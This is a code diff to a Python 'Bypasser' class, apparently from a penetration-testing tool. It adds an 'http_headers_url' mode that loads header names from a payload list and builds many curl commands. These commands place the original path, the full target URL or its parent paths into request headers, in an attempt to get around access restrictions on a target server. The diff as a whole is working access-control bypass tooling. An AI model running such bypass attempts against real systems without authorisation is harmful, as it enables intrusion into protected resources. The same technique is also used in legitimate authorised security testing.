@@ -141,6 +141,8 @@ class Bypasser:
         self.header_proto_schemes = Tools.load_file_into_memory_list(
             "payloads/header_proto_schemes.lst", enc_format=self.encoding, ext_logger=self.logger,
             debug=self.debug_class)
+        self.header_urls = Tools.load_file_into_memory_list(
+            "payloads/header_urls.lst", enc_format=self.encoding, ext_logger=self.logger, debug=self.debug_class)
 
         # Import internal bypass payloads
         self.internal_endpaths = Tools.load_file_into_memory_list(
@@ -335,6 +337,30 @@ class Bypasser:
                                     target_ip=self.url_resolved_ip, encoding=self.encoding, debug=self.debug,
                                     ext_logger=self.logger)
                     self.curl_items.add(item)
+
+        # [http_headers_url] - Custom urls injection headers
+        if any(mode in {"all", "http_headers_url"} for mode in self.current_bypass_modes):
+            commands = set()
+            current_path = Path(base_path)
+            for header_url in self.header_urls:
+                # First variant: Targets the base_url and moves original path to the headers
+                commands.add(tuple([*self.base_curl, "-H", f"{header_url}: {base_path}", f"{base_url}/"]))
+                # Second variant: Targets the base_url and moves target_url to the headers (only for some headers)
+                if any(part in header_url.lower() for part in {"url", "request", "file"}):
+                    commands.add(tuple([*self.base_curl, "-H", f"{header_url}: {target_url}", f"{base_url}/"]))
+                # Third variant: Keeps the original target_url and go up the parent paths in headers
+                for parent in current_path.parents:
+                    parent_path = str(parent).replace('\\', '/')
+                    commands.add(tuple([*self.base_curl, "-H", f"{header_url}: {parent_path}", target_url]))
+                    # Fourth variant: Same as third but with complete url (only for some headers)
+                    if any(part in header_url.lower() for part in {"url", "refer"}):
+                        commands.add(
+                            tuple([*self.base_curl, "-H", f"{header_url}: {base_url}{parent_path}", target_url]))
+            # Add items
+            for command in commands:
+                item = CurlItem(url_obj, self.base_curl, [*command], bypass_mode="http_headers_url", debug=self.debug,
+                                target_ip=self.url_resolved_ip, encoding=self.encoding, ext_logger=self.logger)
+                self.curl_items.add(item)
 
         # [mid_paths] - Custom paths with extra-mid-slash
         if any(mode in {"all", "mid_paths"} for mode in self.current_bypass_modes):
